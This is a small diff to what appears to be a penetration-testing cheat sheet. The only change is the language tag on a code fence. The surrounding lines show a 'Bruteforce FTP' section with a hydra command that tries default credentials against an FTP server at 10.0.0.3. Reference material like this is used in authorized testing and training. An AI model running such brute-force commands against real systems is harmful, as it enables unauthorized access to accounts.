@@ -48,7 +48,7 @@ Payload:
 `"F=Invalid username"` is the string for the error message.
 
 ## Bruteforce FTP
-```
+```console
 root@machine:~$ hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 10.0.0.3 ftp
 
 Options
